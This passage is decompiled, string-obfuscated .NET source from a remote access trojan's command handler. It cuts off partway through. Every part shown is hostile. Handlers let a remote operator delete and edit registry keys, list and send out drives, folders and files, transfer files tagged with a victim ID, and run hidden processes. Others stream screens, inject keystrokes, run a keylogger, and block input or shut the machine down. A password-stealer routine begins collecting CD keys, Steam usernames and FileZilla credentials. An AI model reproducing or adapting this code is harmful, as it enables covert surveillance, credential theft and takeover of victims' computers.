				ProjectData.SetProjectError(projectError35);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("[ŭɤ\u0369ѫժ٦ݡ\u0875"), false) == 0)
		{
			try
			{
				Client.Reconnect();
			}
			catch (Exception projectError36)
			{
				ProjectData.SetProjectError(projectError36);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("AŻɫ\u0375"), false) == 0)
		{
			try
			{
				if (Module2.Persistenz)
				{
					try
					{
						Process[] processesByName2 = Process.GetProcessesByName(GClass0.smethod_0("vŲɹ"));
						foreach (Process process4 in processesByName2)
						{
							process4.Kill();
						}
					}
					catch (Exception projectError37)
					{
						ProjectData.SetProjectError(projectError37);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
					}
					catch (Exception projectError38)
					{
						ProjectData.SetProjectError(projectError38);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
					}
					catch (Exception projectError39)
					{
						ProjectData.SetProjectError(projectError39);
						ProjectData.ClearProjectError();
					}
				}
				Client.Deisconnect();
				Application.Exit();
			}
			catch (Exception projectError40)
			{
				ProjectData.SetProjectError(projectError40);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("FŨɪ\u0361Ѫ"), false) == 0)
		{
			try
			{
				Module1.MausKlick(Conversions.ToInteger(Befehle[1]), Conversions.ToInteger(Befehle[2]), GClass0.smethod_0("s"));
			}
			catch (Exception projectError41)
			{
				ProjectData.SetProjectError(projectError41);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Iŵɡ\u036dсՅ"), false) == 0)
		{
			try
			{
				FunFunktionen.method_0();
			}
			catch (Exception projectError42)
			{
				ProjectData.SetProjectError(projectError42);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("DŪɪͷѦՁم"), false) == 0)
		{
			try
			{
				FunFunktionen.method_1();
			}
			catch (Exception projectError43)
			{
				ProjectData.SetProjectError(projectError43);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Oůɥ\u036dѳՔ٠ݣࡈ१\u0a78"), false) == 0)
		{
			try
			{
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏه\u074b\u085aज़\u0a42\u0b55ౚൖ\u0e4cཌྷၕ"), false) == 0)
				{
					RegistryKey classesRoot = ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot();
					classesRoot.DeleteSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏ\u065eݘ\u085b\u094d\u0a49\u0b52ౚ\u0d51๐ཇၓ"), false) == 0)
				{
					RegistryKey currentUser = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser();
					currentUser.DeleteSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("ZŚɕ\u0356ёՁك\u0748ࡋ\u0945\u0a57\u0b4a\u0c47\u0d46\u0e4cཊ၌ᅄ"), false) == 0)
				{
					RegistryKey localMachine = ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine();
					localMachine.DeleteSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("Błɍ\u035eљՐ\u0657\u0746ࡐ\u0952"), false) == 0)
				{
					RegistryKey users = ((ServerComputer)MyProject.Computer).get_Registry().get_Users();
					users.DeleteSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("[řɔ\u0349ѐՍ\u0658ݞ\u0859\u094f\u0a47ଡ଼ౘ\u0d45\u0e4aཊ၅ᅋቆ"), false) == 0)
				{
					RegistryKey currentConfig = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig();
					currentConfig.DeleteSubKey(Befehle[2]);
				}
			}
			catch (Exception projectError44)
			{
				ProjectData.SetProjectError(projectError44);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Gŭɰ\u0354Ѡգوݧ\u0878"), false) == 0)
		{
			try
			{
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏه\u074b\u085aज़\u0a42\u0b55ౚൖ\u0e4cཌྷၕ"), false) == 0)
				{
					RegistryKey classesRoot2 = ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot();
					classesRoot2.CreateSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏ\u065eݘ\u085b\u094d\u0a49\u0b52ౚ\u0d51๐ཇၓ"), false) == 0)
				{
					RegistryKey currentUser2 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser();
					currentUser2.CreateSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("ZŚɕ\u0356ёՁك\u0748ࡋ\u0945\u0a57\u0b4a\u0c47\u0d46\u0e4cཊ၌ᅄ"), false) == 0)
				{
					RegistryKey localMachine2 = ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine();
					localMachine2.CreateSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("Błɍ\u035eљՐ\u0657\u0746ࡐ\u0952"), false) == 0)
				{
					RegistryKey users2 = ((ServerComputer)MyProject.Computer).get_Registry().get_Users();
					users2.CreateSubKey(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("[řɔ\u0349ѐՍ\u0658ݞ\u0859\u094f\u0a47ଡ଼ౘ\u0d45\u0e4aཊ၅ᅋቆ"), false) == 0)
				{
					RegistryKey currentConfig2 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig();
					currentConfig2.CreateSubKey(Befehle[2]);
				}
			}
			catch (Exception projectError45)
			{
				ProjectData.SetProjectError(projectError45);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("FŢɱ\u0353ѥկٷݤ"), false) == 0)
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(Befehle[1], Befehle[2], (object)Befehle[3]);
			}
			catch (Exception projectError46)
			{
				ProjectData.SetProjectError(projectError46);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Oůɥ\u036dѳգ\u0653ݥ\u086fॷ\u0a64"), false) == 0)
		{
			try
			{
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏه\u074b\u085aज़\u0a42\u0b55ౚൖ\u0e4cཌྷၕ"), false) == 0)
				{
					RegistryKey classesRoot3 = ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot();
					classesRoot3.DeleteValue(Befehle[2]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏ\u065eݘ\u085b\u094d\u0a49\u0b52ౚ\u0d51๐ཇၓ"), false) == 0)
				{
					RegistryKey currentUser3 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser();
					currentUser3.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("ZŚɕ\u0356ёՁك\u0748ࡋ\u0945\u0a57\u0b4a\u0c47\u0d46\u0e4cཊ၌ᅄ"), false) == 0)
				{
					RegistryKey localMachine3 = ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine();
					localMachine3.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("Błɍ\u035eљՐ\u0657\u0746ࡐ\u0952"), false) == 0)
				{
					RegistryKey users3 = ((ServerComputer)MyProject.Computer).get_Registry().get_Users();
					users3.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("[řɔ\u0349ѐՍ\u0658ݞ\u0859\u094f\u0a47ଡ଼ౘ\u0d45\u0e4aཊ၅ᅋቆ"), false) == 0)
				{
					RegistryKey currentConfig3 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig();
					currentConfig3.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
				}
			}
			catch (Exception projectError47)
			{
				ProjectData.SetProjectError(projectError47);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Zūɵ\u0363Ѡժ\u064cݤࡧ"), false) == 0)
		{
			try
			{
				FunFunktionen.MonitorAusschalten();
			}
			catch (Exception projectError48)
			{
				ProjectData.SetProjectError(projectError48);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("KŶɣ\u0341ѭչ"), false) == 0)
		{
			try
			{
				Module1.MsgBoxDetaills msgBoxDetaills = default(Module1.MsgBoxDetaills);
				msgBoxDetaills.Titel = Befehle[1];
				msgBoxDetaills.Text = Befehle[2];
				msgBoxDetaills.Style = Befehle[3];
				Thread thread = new Thread(delegate(object a0)
				{
					Module1.MsgBoxDetaills msgBoxDetaills2 = default(Module1.MsgBoxDetaills);
					Module1.MesboxShow((a0 != null) ? ((Module1.MsgBoxDetaills)a0) : msgBoxDetaills2);
				});
				thread.IsBackground = true;
				thread.Start(msgBoxDetaills);
			}
			catch (Exception projectError49)
			{
				ProjectData.SetProjectError(projectError49);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("[Ťɴ\u0360ѡխ\u064dݯ"), false) == 0)
		{
			try
			{
				FunFunktionen.MonitorEinschalten();
			}
			catch (Exception projectError50)
			{
				ProjectData.SetProjectError(projectError50);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("OŠɤ\u0369ѢՅ٨ݳ\u0876ॡ\u0a48୧౸"), false) == 0)
		{
			try
			{
				FunFunktionen.TastaturMaus_Bloeckieren();
			}
			catch (Exception projectError51)
			{
				ProjectData.SetProjectError(projectError51);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Oŧɼ\u0365Ѫժ٧ݨࡧ९"), false) == 0)
		{
			try
			{
				FunFunktionen.TastaturMaus_Entblocken();
			}
			catch (Exception projectError52)
			{
				ProjectData.SetProjectError(projectError52);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("[ůɳͱрլٵݯ"), false) == 0)
		{
			try
			{
				FunFunktionen.Runterfahren();
			}
			catch (Exception projectError53)
			{
				ProjectData.SetProjectError(projectError53);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("JŪɣ\u034cѷյ"), false) == 0)
		{
			try
			{
				FunFunktionen.Abmelden();
			}
			catch (Exception projectError54)
			{
				ProjectData.SetProjectError(projectError54);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("]ūɾ\u0378Ѫոٽ\u074bࡨ५\u0a75ୱ౷൧\u0e73"), false) == 0)
		{
			try
			{
				FunFunktionen.NeuStarten();
			}
			catch (Exception projectError55)
			{
				ProjectData.SetProjectError(projectError55);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Eũɲ\u0360Ѳաٱݩࡤ"), false) == 0)
		{
			try
			{
				string text4 = GClass0.smethod_0("Aŭɾ\u036cѾխٵݭࡠधਨ\u0b29ఢ");
				foreach (DriveInfo drife in ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives())
				{
					text4 = text4 + drife.Name + GClass0.smethod_0("}ĩɿ");
				}
				text4 += GClass0.smethod_0("'Ĩȩ\u0322");
				text4 = text4 + Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("XŽȩͿ");
				text4 = text4 + Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("XŽȩͿ");
				text4 = text4 + Interaction.Environ(GClass0.smethod_0("qŬɪ\u0367ѫճ")) + GClass0.smethod_0("XŽȩͿ");
				text4 = text4 + Interaction.Environ(GClass0.smethod_0("~Źɬͺѷմ٪ݢࡪ८\u0a64")) + GClass0.smethod_0("XŽȩͿ");
				text4 = text4 + ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + GClass0.smethod_0("XŽȩͿ");
				text4 = text4 + ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + GClass0.smethod_0("XŽȩͿ");
				text4 = text4 + ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures() + GClass0.smethod_0("XŽȩͿ");
				text4 = text4 + ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + GClass0.smethod_0("XŽȩͿ");
				Client.Senden(text4);
			}
			catch (Exception projectError56)
			{
				ProjectData.SetProjectError(projectError56);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("AŹɿ\u0378ъըٿݠࡃ१\u0a44୮\u0c75൱\u0e72ཪ\u1067ᅶ"), false) == 0)
		{
			try
			{
				Module2.VictimID = Befehle[1];
				ShowScreenInListview.Start();
			}
			catch (Exception projectError57)
			{
				ProjectData.SetProjectError(projectError57);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Hūɹ\u0348Ѣոٺݩࡩ\u0962\u0a43୭౯൧\u0e72"), false) == 0)
		{
			try
			{
				string text5 = Befehle[1];
				string text6 = GClass0.smethod_0("Tŷɥ\u0354Ѧռپݭࡥ८\u0a4fୡ౫\u0d63\u0e76༧ဨᄩሢ");
				foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text5))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directory);
					text6 = text6 + directoryInfo.get_Name() + GClass0.smethod_0("\\żɞ");
					text6 = text6 + directoryInfo.FullName + GClass0.smethod_0("\\żɞ");
					text6 += GClass0.smethod_0("Fźɣ\u0368Ѡն\u065cݼ࡞");
					text6 = text6 + directoryInfo.Attributes.ToString() + GClass0.smethod_0("}ĩɿ");
				}
				text6 += GClass0.smethod_0("'Ĩȩ\u0322");
				foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(text5))
				{
					FileInfo fileInfo = new FileInfo(file);
					text6 = text6 + fileInfo.get_Name() + GClass0.smethod_0("\\żɞ");
					text6 = text6 + fileInfo.FullName + GClass0.smethod_0("\\żɞ");
					text6 = text6 + fileInfo.Length + GClass0.smethod_0(")ŊɾͲѠշ\u065cݼ࡞");
					text6 = text6 + fileInfo.Attributes.ToString() + GClass0.smethod_0("}ĩɿ");
				}
				Client.Senden(GClass0.smethod_0("Tŷɥ\u0354Ѧռپݭࡥ८\u0a4fୡ౫\u0d63\u0e76༧ဨᄩሢ") + text6);
			}
			catch (Exception projectError58)
			{
				ProjectData.SetProjectError(projectError58);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Vŵɻ\u0348Ѥՠٮ\u074c\u087b१੪\u0b45౩൭\u0e66ཬၵ"), false) == 0)
		{
			try
			{
				Module2.VictimID = Befehle[3];
				Module1.FileSender fileSender = new Module1.FileSender();
				fileSender.VonHier = Befehle[1];
				fileSender.NachHier = Befehle[2];
				fileSender.Start();
			}
			catch (Exception projectError59)
			{
				ProjectData.SetProjectError(projectError59);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("\\ūɿͺѮո\u065aݭࡩ\u0962੶\u0b42౪൮\u0e64"), false) == 0)
		{
			try
			{
				Module1.FileGetter fileGetter = new Module1.FileGetter();
				Module2.VictimID = Befehle[3];
				fileGetter.vonhier = Befehle[2];
				fileGetter.nachhier = Befehle[1];
				fileGetter.Start();
			}
			catch (Exception projectError60)
			{
				ProjectData.SetProjectError(projectError60);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Nŭɳ\u0354Ѡգوݧ\u0878"), false) == 0)
		{
			try
			{
				string text7 = GClass0.smethod_0("\u007fŘɿ\u036bуբٿݶ\u0827न\u0a29ଢ");
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏه\u074b\u085aज़\u0a42\u0b55ౚൖ\u0e4cཌྷၕ"), false) == 0)
				{
					RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(Befehle[2]);
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string text8 in subKeyNames)
					{
						text7 = text7 + text8 + GClass0.smethod_0("}ĩɿ");
					}
					text7 += GClass0.smethod_0("'Ĩȩ\u0322");
					string[] valueNames = registryKey.GetValueNames();
					foreach (string text9 in valueNames)
					{
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text9 + GClass0.smethod_0("8Ļ")), Registry.GetValue(registryKey.Name, text9, GClass0.smethod_0(""))), (object)GClass0.smethod_0("}ĩɿ"))));
					}
					Client.Senden(text7 + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[2] + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[3] + GClass0.smethod_0("'Ĩȩ\u0322"));
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏ\u065eݘ\u085b\u094d\u0a49\u0b52ౚ\u0d51๐ཇၓ"), false) == 0)
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(Befehle[2]);
					string[] subKeyNames2 = registryKey2.GetSubKeyNames();
					foreach (string text10 in subKeyNames2)
					{
						text7 = text7 + text10 + GClass0.smethod_0("}ĩɿ");
					}
					text7 += GClass0.smethod_0("'Ĩȩ\u0322");
					string[] valueNames2 = registryKey2.GetValueNames();
					foreach (string text11 in valueNames2)
					{
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text11 + GClass0.smethod_0("8Ļ")), Registry.GetValue(registryKey2.Name, text11, GClass0.smethod_0(""))), (object)GClass0.smethod_0("}ĩɿ"))));
					}
					Client.Senden(text7 + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[2] + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[3] + GClass0.smethod_0("'Ĩȩ\u0322"));
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("ZŚɕ\u0356ёՁك\u0748ࡋ\u0945\u0a57\u0b4a\u0c47\u0d46\u0e4cཊ၌ᅄ"), false) == 0)
				{
					RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(Befehle[2]);
					string[] subKeyNames3 = registryKey3.GetSubKeyNames();
					foreach (string text12 in subKeyNames3)
					{
						text7 = text7 + text12 + GClass0.smethod_0("}ĩɿ");
					}
					text7 += GClass0.smethod_0("'Ĩȩ\u0322");
					string[] valueNames3 = registryKey3.GetValueNames();
					foreach (string text13 in valueNames3)
					{
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text13 + GClass0.smethod_0("8Ļ")), Registry.GetValue(registryKey3.Name, text13, GClass0.smethod_0(""))), (object)GClass0.smethod_0("}ĩɿ"))));
					}
					Client.Senden(text7 + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[2] + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[3] + GClass0.smethod_0("'Ĩȩ\u0322"));
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("Błɍ\u035eљՐ\u0657\u0746ࡐ\u0952"), false) == 0)
				{
					RegistryKey registryKey4 = Registry.Users.OpenSubKey(Befehle[2]);
					string[] subKeyNames4 = registryKey4.GetSubKeyNames();
					foreach (string text14 in subKeyNames4)
					{
						text7 = text7 + text14 + GClass0.smethod_0("}ĩɿ");
					}
					text7 += GClass0.smethod_0("'Ĩȩ\u0322");
					string[] valueNames4 = registryKey4.GetValueNames();
					foreach (string text15 in valueNames4)
					{
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text15 + GClass0.smethod_0("8Ļ")), Registry.GetValue(registryKey4.Name, text15, GClass0.smethod_0(""))), (object)GClass0.smethod_0("}ĩɿ"))));
					}
					Client.Senden(text7 + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[2] + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[3] + GClass0.smethod_0("'Ĩȩ\u0322"));
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("[řɔ\u0349ѐՍ\u0658ݞ\u0859\u094f\u0a47ଡ଼ౘ\u0d45\u0e4aཊ၅ᅋቆ"), false) == 0)
				{
					RegistryKey registryKey5 = Registry.CurrentConfig.OpenSubKey(Befehle[2]);
					string[] subKeyNames5 = registryKey5.GetSubKeyNames();
					foreach (string text16 in subKeyNames5)
					{
						text7 = text7 + text16 + GClass0.smethod_0("}ĩɿ");
					}
					text7 += GClass0.smethod_0("'Ĩȩ\u0322");
					string[] valueNames5 = registryKey5.GetValueNames();
					foreach (string text17 in valueNames5)
					{
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text17 + GClass0.smethod_0("8Ļ")), Registry.GetValue(registryKey5.Name, text17, GClass0.smethod_0(""))), (object)GClass0.smethod_0("}ĩɿ"))));
					}
					Client.Senden(text7 + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[2] + GClass0.smethod_0("'Ĩȩ\u0322") + Befehle[3] + GClass0.smethod_0("'Ĩȩ\u0322"));
				}
			}
			catch (Exception projectError61)
			{
				ProjectData.SetProjectError(projectError61);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("MŬɼ\u0345ѧն١\u0748ࡧॸ"), false) == 0)
		{
			try
			{
				string text18 = GClass0.smethod_0("Xſɫ\u0343Ѣտٶܧࠨऩਢ");
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏه\u074b\u085aज़\u0a42\u0b55ౚൖ\u0e4cཌྷၕ"), false) == 0)
				{
					string[] subKeyNames6 = ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().GetSubKeyNames();
					foreach (string text19 in subKeyNames6)
					{
						text18 = text18 + text19 + GClass0.smethod_0("}ĩɿ");
					}
					Client.Senden(text18);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("YśɊ\u0357ђՏ\u065eݘ\u085b\u094d\u0a49\u0b52ౚ\u0d51๐ཇၓ"), false) == 0)
				{
					string[] subKeyNames7 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().GetSubKeyNames();
					foreach (string text20 in subKeyNames7)
					{
						text18 = text18 + text20 + GClass0.smethod_0("}ĩɿ");
					}
					Client.Senden(text18);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("ZŚɕ\u0356ёՁك\u0748ࡋ\u0945\u0a57\u0b4a\u0c47\u0d46\u0e4cཊ၌ᅄ"), false) == 0)
				{
					string[] subKeyNames8 = ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().GetSubKeyNames();
					foreach (string text21 in subKeyNames8)
					{
						text18 = text18 + text21 + GClass0.smethod_0("}ĩɿ");
					}
					Client.Senden(text18);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("Błɍ\u035eљՐ\u0657\u0746ࡐ\u0952"), false) == 0)
				{
					string[] subKeyNames9 = ((ServerComputer)MyProject.Computer).get_Registry().get_Users().GetSubKeyNames();
					foreach (string text22 in subKeyNames9)
					{
						text18 = text18 + text22 + GClass0.smethod_0("}ĩɿ");
					}
					Client.Senden(text18);
				}
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("[řɔ\u0349ѐՍ\u0658ݞ\u0859\u094f\u0a47ଡ଼ౘ\u0d45\u0e4aཊ၅ᅋቆ"), false) == 0)
				{
					string[] subKeyNames10 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig().GetSubKeyNames();
					foreach (string text23 in subKeyNames10)
					{
						text18 = text18 + text23 + GClass0.smethod_0("}ĩɿ");
					}
					Client.Senden(text18);
				}
			}
			catch (Exception projectError62)
			{
				ProjectData.SetProjectError(projectError62);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Bšɫ\u036aсեٷݧࡨ"), false) == 0)
		{
			try
			{
				File.Delete(Befehle[1]);
			}
			catch (Exception projectError63)
			{
				ProjectData.SetProjectError(projectError63);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Gŷɣ\u036bтժٮݤ"), false) == 0)
		{
			try
			{
				if (Operators.CompareString(Befehle[2], GClass0.smethod_0("0"), false) == 0)
				{
					Process process5 = new Process();
					process5.StartInfo.FileName = Befehle[1];
					process5.Start();
				}
				else if (Operators.CompareString(Befehle[2], GClass0.smethod_0("1"), false) == 0)
				{
					Process process6 = new Process();
					process6.StartInfo.FileName = Befehle[1];
					process6.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process6.Start();
				}
			}
			catch (Exception projectError64)
			{
				ProjectData.SetProjectError(projectError64);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("YŬɦ\u0363яը٥ݤࡧॲ"), false) == 0)
		{
			try
			{
				Module1.SendImages sendImages = new Module1.SendImages();
				Module2.VictimID = Befehle[2];
				sendImages.Pfad = Befehle[1];
				sendImages.Start();
			}
			catch (Exception projectError65)
			{
				ProjectData.SetProjectError(projectError65);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("LŦɬ\u0362Ѭկ\u065eݩ\u086b४\u0a75\u0b65\u0c73൧\u0e73"), false) == 0)
		{
			try
			{
				Module1.ChangeWallpaper(Befehle[1]);
			}
			catch (Exception projectError66)
			{
				ProjectData.SetProjectError(projectError66);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("[Ţɨ\u0361яզٻݲ"), false) == 0)
		{
			try
			{
				SendKeys.SendWait(Befehle[1].Replace(GClass0.smethod_0("\\Ńɋ\u0350цՐ\u065c"), GClass0.smethod_0("\u000fċ")));
			}
			catch (Exception projectError67)
			{
				ProjectData.SetProjectError(projectError67);
				ProjectData.ClearProjectError();
			}
		}
		checked
		{
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("FŦɧͱ"), false) == 0)
			{
				try
				{
					int num13 = Conversions.ToInteger(Befehle[1]);
					int frequency = Conversions.ToInteger(Befehle[2]);
					Console.Beep(frequency, num13 * 1000);
				}
				catch (Exception projectError68)
				{
					ProjectData.SetProjectError(projectError68);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Iťɡ\u0364ѭ\u0557٭ݤࡪॵ"), false) == 0)
			{
				try
				{
					int num14 = Conversions.ToInteger(Befehle[1]);
					int num15 = Conversions.ToInteger(Befehle[2]);
					Point position = new Point(num14, num15);
					Cursor.set_Position(position);
					Module1.mouse_event(8, num14, num15, 0, 0);
					Module1.mouse_event(16, num14, num15, 0, 0);
				}
				catch (Exception projectError69)
				{
					ProjectData.SetProjectError(projectError69);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Cŧɡͺџբ٤ݮ\u086d६\u0a55୦\u0c76൦\u0e67\u0f6f"), false) == 0)
			{
				try
				{
					Module2.VictimID = Befehle[1];
					Module1.ShowSingelScreen showSingelScreen = new Module1.ShowSingelScreen();
					showSingelScreen.Start();
				}
				catch (Exception projectError70)
				{
					ProjectData.SetProjectError(projectError70);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("]Źɭ\u0379ѾՂ٭ݾࡪ४\u0a63\u0b64౧൳"), false) == 0)
			{
				try
				{
					if (Module2.OffKeylogger)
					{
						OfKeylogger.Stopp();
					}
					Keylogger.Start();
				}
				catch (Exception projectError71)
				{
					ProjectData.SetProjectError(projectError71);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("]ŹɣͻѺՂ٭ݾࡪ४\u0a63\u0b64౧൳"), false) == 0)
			{
				if (Module2.OffKeylogger)
				{
					OfKeylogger.Start();
				}
				Keylogger.Stopp();
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Yũɴ\u0375Ѳիٱݶࡤ"), false) == 0)
			{
				try
				{
					string text24 = GClass0.smethod_0("]ŭɸ\u0379Ѿէٵݲࡠधਨ\u0b29ఢ");
					text24 += Passwortstealer.CD_SerialKeys();
					text24 = Conversions.ToString(Operators.ConcatenateObject((object)text24, Passwortstealer.SteamUserNamenStealen()));
					text24 += Passwortstealer.FileZilla_Stealen();
